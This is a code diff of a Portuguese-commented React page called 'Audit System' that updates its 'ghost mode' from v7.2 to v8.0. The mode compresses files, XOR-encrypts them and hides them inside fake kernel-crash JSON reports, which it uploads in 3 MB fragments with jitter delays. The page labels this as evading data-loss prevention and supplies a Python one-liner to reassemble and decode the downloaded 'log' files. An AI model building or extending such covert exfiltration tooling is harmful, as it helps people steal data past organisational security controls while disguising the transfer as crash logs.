@@ -2,7 +2,7 @@
 
 import { useState, useRef, useCallback } from 'react';
 
-// --- Interfaces da Nova API v2 (Suporte a Paginação) ---
+// --- Interfaces da API (Compatível com v7.2+) ---
 interface BlobFile {
   url: string;
   pathname: string;
@@ -30,16 +30,17 @@ export default function AuditPage() {
   const [token, setToken] = useState('');
   const [status, setStatus] = useState({ msg: '', type: '' });
   const [loading, setLoading] = useState(false);
+  const [progress, setProgress] = useState(''); // NOVO: Indicador de progresso das partes
   const [isDragging, setIsDragging] = useState(false);
 
-  // Estados de Dados (Nova Lógica de Paginação)
+  // Estados de Dados
   const [files, setFiles] = useState<BlobFile[]>([]);
   const [nextCursor, setNextCursor] = useState<string | null>(null);
   const [hasMore, setHasMore] = useState(false);
   const [stats, setStats] = useState({ totalShownBytes: 0, count: 0 });
-  const [searchPrefix, setSearchPrefix] = useState(''); // Filtro
+  const [searchPrefix, setSearchPrefix] = useState('');
 
-  // Estados de Auditoria (Stealth v7.0)
+  // Estados Stealth v8.0
   const [stealthMode, setStealthMode] = useState(false);
   const [useCompression, setUseCompression] = useState(true);
 
@@ -50,10 +51,11 @@ export default function AuditPage() {
 
   const showStatus = (msg: string, type: string) => {
     setStatus({ msg, type });
-    setTimeout(() => setStatus({ msg: '', type: '' }), 4000);
+    // Limpa msg após 4s, exceto se for erro persistente
+    setTimeout(() => setStatus(prev => prev.msg === msg ? { msg: '', type: '' } : prev), 4000);
   };
 
-  // --- BUSCA DE ARQUIVOS (Atualizado para v7.2) ---
+  // --- BUSCA (API v7.2 - Mantida) ---
   const fetchFiles = async (isLoadMore = false) => {
     if (!token) {
       if (!isLoadMore) showStatus('Insira o Token primeiro.', 'error');
@@ -61,11 +63,10 @@ export default function AuditPage() {
     }
 
     try {
-      setLoading(true);
+      if (!isLoadMore) setLoading(true);
 
-      // Constrói a URL com parâmetros de paginação e filtro
       const params = new URLSearchParams();
-      params.set('limit', '50'); // Traz 50 por página
+      params.set('limit', '50');
       if (searchPrefix) params.set('prefix', searchPrefix);
       if (isLoadMore && nextCursor) params.set('cursor', nextCursor);
 
@@ -75,32 +76,22 @@ export default function AuditPage() {
 
       if (res.ok) {
         const data: ApiResponse = await res.json();
-
         if (isLoadMore) {
-          // Append: Adiciona novos arquivos à lista existente
           setFiles(prev => [...prev, ...data.blobs]);
         } else {
-          // Reset: Substitui a lista (nova busca ou refresh)
           setFiles(data.blobs);
         }
-
-        // Atualiza ponteiros de paginação
         setNextCursor(data.cursor || null);
         setHasMore(data.hasMore);
-
-        // Atualiza estatísticas de visualização
         setStats(prev => ({
           count: isLoadMore ? prev.count + data.meta.count : data.meta.count,
           totalShownBytes: isLoadMore ? prev.totalShownBytes + data.meta.page_size_bytes : data.meta.page_size_bytes
         }));
-
       } else {
-        if (res.status === 401) showStatus('Acesso Negado: Token Inválido', 'error');
-        else showStatus('Erro ao buscar lista', 'error');
+        if (res.status === 401) showStatus('Token Inválido', 'error');
       }
     } catch (error) {
       console.error(error);
-      showStatus('Erro de conexão', 'error');
     } finally {
       setLoading(false);
     }
@@ -108,25 +99,18 @@ export default function AuditPage() {
 
   const handleSearch = (e: React.FormEvent) => {
     e.preventDefault();
-    fetchFiles(false); // Nova busca limpa a lista atual
+    fetchFiles(false);
   };
 
-  // --- Funções Auxiliares Stealth (MANTIDAS DO v7.0) ---
-  const compressFile = async (file: File): Promise<Uint8Array> => {
+  // --- Funções Auxiliares Stealth ---
+  const compressFile = async (file: File | Blob): Promise<Uint8Array> => {
     const stream = file.stream().pipeThrough(new CompressionStream('gzip'));
     return new Response(stream).arrayBuffer().then(buffer => new Uint8Array(buffer));
   };
 
-  const bufferToBase64 = (buffer: Uint8Array): string => {
-    let binary = '';
-    const len = buffer.byteLength;
-    for (let i = 0; i < len; i++) binary += String.fromCharCode(buffer[i]);
-    return btoa(binary);
-  };
-
-  const fileToBase64 = (file: File) => new Promise<string>((resolve, reject) => {
+  const blobToBase64 = (blob: Blob) => new Promise<string>((resolve, reject) => {
     const reader = new FileReader();
-    reader.readAsDataURL(file);
+    reader.readAsDataURL(blob);
     reader.onload = () => resolve(reader.result as string);
     reader.onerror = error => reject(error);
   });
@@ -147,77 +131,121 @@ export default function AuditPage() {
     return hex;
   };
 
-  // --- UPLOAD PROCESS (Stealth v7.0) ---
+  // --- UPLOAD PROCESS (Atualizado: Stealth v8.0 - Fragmentação) ---
   const handleUploadProcess = async (file: File) => {
     if (!token) { showStatus('Token necessário.', 'error'); return; }
     setLoading(true);
-    showStatus(stealthMode ? 'Camuflando v7.0...' : 'Enviando...', 'info');
+    setProgress('Iniciando...');
 
     try {
-      let response;
+      // Limite seguro para Vercel Functions (JSON Body) ~3MB para deixar margem
+      const CHUNK_SIZE = 1024 * 1024 * 3;
 
       if (stealthMode) {
-        let contentBase64 = '';
+        // >>> MODO STEALTH FRAGMENTADO <<<
+
+        let fileDataToProcess: Uint8Array | string;
+
+        // 1. Preparação (Compressão Global ou Leitura)
+        // Comprimimos o arquivo INTEIRO antes de fatiar para melhor taxa
         if (useCompression) {
-          const compressedBytes = await compressFile(file);
-          contentBase64 = bufferToBase64(compressedBytes);
+          setProgress('Comprimindo arquivo...');
+          fileDataToProcess = await compressFile(file); // Retorna Uint8Array
         } else {
-          contentBase64 = await fileToBase64(file);
-          if (contentBase64.includes(',')) contentBase64 = contentBase64.split(',')[1];
+          // Se não comprimir, lemos como string base64 para processar
+          const b64 = await blobToBase64(file);
+          fileDataToProcess = b64.includes(',') ? b64.split(',')[1] : b64;
         }
 
-        const hiddenPayload = `${file.name}::${contentBase64}`;
-        const encryptedBinary = xorEncrypt(hiddenPayload, token);
-        const memoryDump = stringToHex(encryptedBinary);
+        // Convertemos tudo para string binária (se já não for) para poder fatiar
+        let binaryString = '';
+        if (fileDataToProcess instanceof Uint8Array) {
+          for (let i = 0; i < fileDataToProcess.byteLength; i++) {
+            binaryString += String.fromCharCode(fileDataToProcess[i]);
+          }
+        } else {
+          binaryString = atob(fileDataToProcess as string);
+        }
 
-        const crashReport = {
-          type: "system_crash",
-          severity: "critical",
-          timestamp: Date.now(),
-          module: "kernel_panic_handler",
-          memory_dump: memoryDump
-        };
+        const totalSize = binaryString.length;
+        const totalChunks = Math.ceil(totalSize / CHUNK_SIZE);
 
-        const logId = Math.floor(Math.random() * 900000) + 100000;
+        showStatus(`Modo Fragmentado: ${totalChunks} partes`, 'info');
 
-        response = await fetch(`/api/upload?mode=stealth&log_id=${logId}`, {
-          method: 'POST',
-          headers: {
-            'x-audit-token': token,
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(crashReport)
-        });
+        for (let i = 0; i < totalChunks; i++) {
+          const start = i * CHUNK_SIZE;
+          const end = Math.min(start + CHUNK_SIZE, totalSize);
+          const chunkBinary = binaryString.substring(start, end);
+
+          // Converte chunk para Base64 para transporte
+          const chunkBase64 = btoa(chunkBinary);
+
+          // Nome do arquivo: file.ext.part001
+          const partNumber = (i + 1).toString().padStart(3, '0');
+          const partName = totalChunks > 1
+            ? `${file.name}.part${partNumber}`
+            : file.name;
+
+          setProgress(`Enviando parte ${i + 1}/${totalChunks}...`);
+
+          // Encapsulamento Stealth v7
+          const hiddenPayload = `${partName}::${chunkBase64}`;
+          const encryptedBinary = xorEncrypt(hiddenPayload, token);
+          const memoryDump = stringToHex(encryptedBinary);
+
+          const crashReport = {
+            type: "system_crash_fragment",
+            part: i + 1,
+            total_parts: totalChunks,
+            timestamp: Date.now(),
+            memory_dump: memoryDump
+          };
+
+          const logId = Math.floor(Math.random() * 900000) + 100000;
+
+          // Adiciona sufixo ao ID para garantir unicidade das partes
+          const res = await fetch(`/api/upload?mode=stealth&log_id=${logId}_p${partNumber}`, {
+            method: 'POST',
+            headers: { 'x-audit-token': token, 'Content-Type': 'application/json' },
+            body: JSON.stringify(crashReport)
+          });
+
+          if (!res.ok) throw new Error(`Falha na parte ${i + 1}`);
+
+          // Pequeno delay para evitar rate-limit (Jitter)
+          await new Promise(r => setTimeout(r, 200));
+        }
 
       } else {
-        response = await fetch(`/api/upload?filename=${file.name}`, {
-          method: 'POST',
-          body: file,
-          headers: { 'x-audit-token': token }
+        // >>> MODO PADRÃO (Stream direto) <<<
+        // O modo padrão suporta arquivos grandes nativamente via stream
+        const res = await fetch(`/api/upload?filename=${file.name}`, {
+          method: 'POST', body: file, headers: { 'x-audit-token': token }
         });
+        if (!res.ok) throw new Error('Falha no upload');
       }
 
-      if (!response.ok) throw new Error('Falha no upload');
-
-      showStatus('Sucesso!', 'success');
+      showStatus('Sucesso! Upload concluído.', 'success');
       if (inputFileRef.current) inputFileRef.current.value = "";
-      await fetchFiles(false); // Recarrega a lista do zero
+      setProgress('');
+      await fetchFiles(false);
+
     } catch (e: any) {
       showStatus(`Erro: ${e.message}`, 'error');
+      setProgress('');
     } finally {
       setLoading(false);
     }
   };
 
-  // --- DOWNLOAD STEALTH (Proxy) ---
+  // --- DOWNLOAD STEALTH (Atualizado: Suporte a Múltiplas Partes) ---
   const handleStealthDownload = async (file: BlobFile) => {
     if (!token) { showStatus('Token necessário.', 'error'); return; }
-    showStatus('Baixando via Proxy Seguro...', 'info');
+    showStatus('Baixando via Proxy...', 'info');
 
     try {
       const res = await fetch(`/api/upload?url=${encodeURIComponent(file.url)}`, {
-        method: 'GET',
-        headers: { 'x-audit-token': token }
+        method: 'GET', headers: { 'x-audit-token': token }
       });
 
       if (!res.ok) throw new Error('Falha no proxy');
@@ -226,13 +254,31 @@ export default function AuditPage() {
       const downloadUrl = window.URL.createObjectURL(blob);
       const link = document.createElement('a');
       link.href = downloadUrl;
-      link.setAttribute('download', `system_error_log_${Math.floor(Date.now() / 1000)}.log`);
+
+      // Nome inteligente: se for parte, mantém o nome da parte para o decoder achar
+      const saveName = file.pathname.includes('.part') ? `system_log_${file.pathname}` : `system_error_${Date.now()}.log`;
+      link.setAttribute('download', saveName);
       document.body.appendChild(link);
       link.click();
       link.remove();
 
-      showStatus('Log baixado. Use o comando para restaurar.', 'success');
-      const cmd = `python3 -c "import sys;key='${token}';c=open(sys.argv[1]).read().split('START\\n')[1].split('\\nMEMORY')[0].strip();b=bytes.fromhex(c);o=bytes([b[i]^ord(key[i%len(key)]) for i in range(len(b))]);open('RESTORED_${file.pathname}','wb').write(o);print('Restaurado!')" system_error_*.log`;
+      showStatus('Baixado. Use o comando abaixo (suporta partes).', 'success');
+
+      // COMANDO DECODER v8.0 (Suporta costura de arquivos .part*)
+      const cmd = `python3 -c "import sys, re; key='${token}';
+files = sorted(sys.argv[1:]); 
+full_hex = '';
+for f in files:
+    try:
+        c = open(f).read();
+        full_hex += c.split('START\\n')[1].split('\\nMEMORY')[0].strip()
+    except: pass;
+b = bytes.fromhex(full_hex);
+o = bytes([b[i]^ord(key[i%len(key)]) for i in range(len(b))]);
+fname = 'RESTORED_' + files[0].replace('system_log_','').split('.part')[0];
+open(fname,'wb').write(o);
+print(f'Sucesso! Salvo como {fname}')" *.log`;
+
       setDecoderCmd(cmd);
     } catch (e) {
       showStatus('Erro no download.', 'error');
@@ -248,11 +294,11 @@ export default function AuditPage() {
   }, [token, stealthMode, useCompression]);
 
   const handleDelete = async (url: string) => {
-    if (!confirm('Deletar permanentemente?')) return;
+    if (!confirm('Deletar?')) return;
     try {
       await fetch(`/api/upload?url=${url}`, { method: 'DELETE', headers: { 'x-audit-token': token } });
       setFiles(files.filter(f => f.url !== url));
-      showStatus('Arquivo removido', 'success');
+      showStatus('Deletado', 'success');
     } catch (e) { showStatus('Erro ao deletar', 'error'); }
   };
 
@@ -280,28 +326,22 @@ export default function AuditPage() {
     <main className="min-h-screen bg-gray-950 text-gray-300 font-sans p-6">
       <div className="max-w-4xl mx-auto">
         <header className="flex flex-col md:flex-row justify-between items-center mb-6 border-b border-gray-800 pb-4 gap-4">
-          <h1 className="text-2xl font-bold text-red-500">Audit System <span className="text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded">v7.2 Scalable</span></h1>
-          <input
-            type="password"
-            value={token}
-            onChange={(e) => setToken(e.target.value)}
-            placeholder="Token (Chave Mestra)"
-            className="bg-gray-900 border border-gray-700 text-white px-3 py-1 rounded text-sm w-48 focus:border-red-500 outline-none transition-all"
-          />
+          <h1 className="text-2xl font-bold text-red-500">Audit System <span className="text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded">v8.0 Frag+Scalable</span></h1>
+          <input type="password" value={token} onChange={(e) => setToken(e.target.value)} placeholder="Token (Chave Mestra)" className="bg-gray-900 border border-gray-700 text-white px-3 py-1 rounded text-sm w-48 focus:border-red-500 outline-none" />
         </header>
 
         {status.msg && <div className={`fixed top-4 right-4 px-6 py-3 rounded text-white font-bold z-50 ${status.type === 'error' ? 'bg-red-600' : 'bg-green-600'}`}>{status.msg}</div>}
 
-        {/* Decoder Panel */}
+        {/* Decoder Panel v8.0 */}
         {decoderCmd && (
-          <div className="mb-6 bg-gray-900 border border-yellow-600/50 p-4 rounded-lg relative animate-pulse-once shadow-lg">
+          <div className="mb-6 bg-gray-900 border border-yellow-600/50 p-4 rounded-lg shadow-lg">
             <button onClick={() => setDecoderCmd(null)} className="absolute top-2 right-2 text-gray-500 hover:text-white">&times;</button>
-            <h3 className="text-yellow-500 font-bold mb-2">⚠️ Download Stealth Concluído</h3>
-            <p className="text-sm text-gray-400 mb-2">Comando para restaurar o arquivo original:</p>
+            <h3 className="text-yellow-500 font-bold mb-2">⚠️ Decodificador Universal (v8.0)</h3>
+            <p className="text-sm text-gray-400 mb-2">Este comando junta automaticamente arquivos fragmentados (part1, part2...):</p>
             <div className="bg-black p-3 rounded border border-gray-700 font-mono text-xs text-green-400 break-all select-all cursor-pointer" onClick={() => navigator.clipboard.writeText(decoderCmd)}>
               {decoderCmd}
             </div>
-            <p className="text-[10px] text-gray-600 mt-2 text-center uppercase">Clique no código para copiar</p>
+            <p className="text-[10px] text-gray-500 mt-2 text-center uppercase">Clique no código para copiar</p>
           </div>
         )}
 
@@ -309,96 +349,57 @@ export default function AuditPage() {
         <div className={`mb-6 p-4 rounded border flex flex-col gap-4 transition-colors ${stealthMode ? 'bg-red-900/10 border-red-600' : 'bg-gray-900 border-gray-700'}`}>
           <div className="flex items-center gap-3">
             <input id="stealth-mode" type="checkbox" checked={stealthMode} onChange={(e) => setStealthMode(e.target.checked)} className="w-5 h-5 accent-red-600 cursor-pointer" />
-            <label htmlFor="stealth-mode" className={`font-bold text-lg cursor-pointer ${stealthMode ? 'text-red-400' : 'text-white'}`}>{stealthMode ? '👻 MODO GHOST (Anti-DLP)' : '🔓 Modo Padrão'}</label>
+            <label htmlFor="stealth-mode" className={`font-bold text-lg cursor-pointer ${stealthMode ? 'text-red-400' : 'text-white'}`}>{stealthMode ? '👻 MODO GHOST (Fragmentado)' : '🔓 Modo Padrão'}</label>
           </div>
-          {stealthMode && <div className="pl-8 text-sm text-gray-400"><input type="checkbox" checked={useCompression} onChange={e => setUseCompression(e.target.checked)} className="mr-2" /> Compressão Gzip (Recomendado)</div>}
+          {stealthMode && <div className="pl-8 text-sm text-gray-400">Arquivos grandes serão divididos em partes de 3MB.</div>}
         </div>
 
         {/* Upload Zone */}
         <div onDragOver={onDragOver} onDragLeave={onDragLeave} onDrop={onDrop} className={`border-2 border-dashed rounded-xl p-8 text-center cursor-pointer mb-8 ${isDragging ? 'border-red-500 bg-red-900/20' : 'border-gray-700 bg-gray-900/30'}`}>
           <input type="file" ref={inputFileRef} onChange={(e) => e.target.files && handleUploadProcess(e.target.files[0])} className="hidden" id="fileUpload" />
           <label htmlFor="fileUpload" className="cursor-pointer flex flex-col items-center">
-            <span className="text-lg font-medium text-gray-300">{loading ? 'Processando...' : 'Arraste arquivos aqui'}</span>
+            <span className="text-lg font-medium text-gray-300">{loading ? `Processando... ${progress}` : 'Arraste arquivos aqui'}</span>
           </label>
         </div>
 
-        {/* --- BARRA DE FERRAMENTAS v7.2 --- */}
+        {/* Toolbar */}
         <div className="flex flex-col sm:flex-row justify-between items-end sm:items-center mb-4 gap-4 bg-gray-900 p-3 rounded border border-gray-800">
-
-          {/* Busca / Filtro */}
           <form onSubmit={handleSearch} className="flex gap-2 w-full sm:w-auto flex-1 max-w-md">
-            <input
-              type="text"
-              value={searchPrefix}
-              onChange={(e) => setSearchPrefix(e.target.value)}
-              placeholder="Filtrar por nome ou pasta..."
-              className="bg-gray-950 border border-gray-700 text-white px-3 py-1.5 rounded text-sm w-full focus:border-blue-500 outline-none"
-            />
-            <button type="submit" className="bg-blue-800 hover:bg-blue-700 text-white px-4 py-1.5 rounded text-sm transition-colors border border-blue-700">
-              🔍
-            </button>
+            <input type="text" value={searchPrefix} onChange={(e) => setSearchPrefix(e.target.value)} placeholder="Filtrar..." className="bg-gray-950 border border-gray-700 text-white px-3 py-1.5 rounded text-sm w-full outline-none" />
+            <button type="submit" className="bg-blue-800 hover:bg-blue-700 text-white px-4 py-1.5 rounded text-sm">🔍</button>
           </form>
-
-          {/* Botão Recarregar */}
-          <button onClick={() => fetchFiles(false)} className="text-xs sm:text-sm bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded border border-gray-700 transition-colors whitespace-nowrap">
-            ↻ Recarregar
-          </button>
+          <button onClick={() => fetchFiles(false)} className="text-sm bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded border border-gray-700">↻ Recarregar</button>
         </div>
 
-        {/* Stats */}
-        {files.length > 0 && (
-          <div className="text-xs text-gray-500 mb-2 text-right">
-            Exibindo {files.length} arquivos • Total visível: {formatBytes(stats.totalShownBytes)}
-          </div>
-        )}
+        {/* File List */}
+        {files.length > 0 && <div className="text-xs text-gray-500 mb-2 text-right">Exibindo {files.length} • {formatBytes(stats.totalShownBytes)}</div>}
 
-        {/* Lista de Arquivos */}
         <div className="space-y-3">
           {files.map((file) => (
-            <div key={file.url} className="group flex items-center justify-between bg-gray-900 p-3 rounded-lg border border-gray-800 hover:border-red-900/50 transition-all">
+            <div key={file.url} className="group flex items-center justify-between bg-gray-900 p-3 rounded-lg border border-gray-800 hover:border-red-900/50">
               <div className="flex items-center gap-3 overflow-hidden">
-                <div className={`w-10 h-10 rounded flex items-center justify-center font-bold text-[10px] shrink-0 bg-blue-900 text-blue-200`}>
-                  {file.pathname.split('.').pop()?.toUpperCase().substring(0, 4)}
+                <div className={`w-10 h-10 rounded flex items-center justify-center font-bold text-[10px] shrink-0 ${file.pathname.includes('part') ? 'bg-purple-900 text-purple-200' : 'bg-blue-900 text-blue-200'}`}>
+                  {file.pathname.includes('part') ? 'PART' : file.pathname.split('.').pop()?.substring(0, 4).toUpperCase()}
                 </div>
                 <div className="flex flex-col overflow-hidden">
                   <span className="text-sm font-medium text-gray-200 truncate cursor-pointer hover:text-red-400" onClick={() => handlePreview(file)}>{file.pathname}</span>
                   <span className="text-[10px] text-gray-500">{formatBytes(file.size)} • {new Date(file.uploadedAt).toLocaleString()}</span>
                 </div>
               </div>
-
               <div className="flex items-center gap-2 opacity-100 sm:opacity-40 group-hover:opacity-100 transition-opacity">
-                <button onClick={() => handleStealthDownload(file)} className="p-2 hover:bg-yellow-900/30 rounded text-yellow-500" title="Baixar Stealth (Proxy)">🛡️</button>
-                <button onClick={() => handlePreview(file)} className="p-2 hover:bg-gray-700 rounded text-blue-400" title="Ver">👁️</button>
-                <button onClick={() => { navigator.clipboard.writeText(file.url); showStatus('Link copiado!', 'success'); }} className="p-2 hover:bg-gray-700 rounded text-gray-400" title="Link">📋</button>
+                <button onClick={() => handleStealthDownload(file)} className="p-2 hover:bg-yellow-900/30 rounded text-yellow-500" title="Baixar Stealth">🛡️</button>
                 <button onClick={() => handleDelete(file.url)} className="p-2 hover:bg-red-900/30 rounded text-red-400" title="Apagar">🗑️</button>
               </div>
             </div>
           ))}
-
-          {/* Botão de Paginação (Load More) */}
-          {hasMore && (
-            <button
-              onClick={() => fetchFiles(true)}
-              disabled={loading}
-              className="w-full py-3 bg-gray-800 hover:bg-gray-700 text-gray-300 text-sm font-medium rounded border border-gray-700 transition-colors mt-4 flex justify-center items-center gap-2"
-            >
-              {loading ? 'Carregando...' : '⬇️ Carregar Mais Arquivos'}
-            </button>
-          )}
-
-          {files.length === 0 && !loading && <p className="text-gray-600 text-center py-8 border border-dashed border-gray-800 rounded">Nenhum arquivo encontrado. Use o Token ou ajuste o filtro.</p>}
+          {hasMore && <button onClick={() => fetchFiles(true)} disabled={loading} className="w-full py-3 bg-gray-800 hover:bg-gray-700 text-gray-300 text-sm rounded border border-gray-700 mt-4">⬇️ Carregar Mais</button>}
         </div>
       </div>
-
-      {/* Modal Preview */}
       {previewContent && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50 backdrop-blur-sm">
           <div className="bg-gray-900 border border-gray-700 w-full max-w-3xl rounded-lg flex flex-col max-h-[85vh]">
-            <div className="flex justify-between items-center p-4 border-b border-gray-800">
-              <h3 className="font-bold text-red-400 truncate">{previewTitle}</h3>
-              <button onClick={() => setPreviewContent(null)} className="text-gray-400 hover:text-white text-2xl">&times;</button>
-            </div>
-            <pre className="p-4 font-mono text-xs text-gray-300 overflow-auto whitespace-pre-wrap">{previewContent}</pre>
+            <div className="flex justify-between items-center p-4 border-b border-gray-800"><h3 className="font-bold text-red-400 truncate">{previewTitle}</h3><button onClick={() => setPreviewContent(null)} className="text-gray-400 text-2xl">&times;</button></div>
+            <pre className="p-4 font-mono text-xs text-gray-300 overflow-auto">{previewContent}</pre>
           </div>
         </div>
       )}
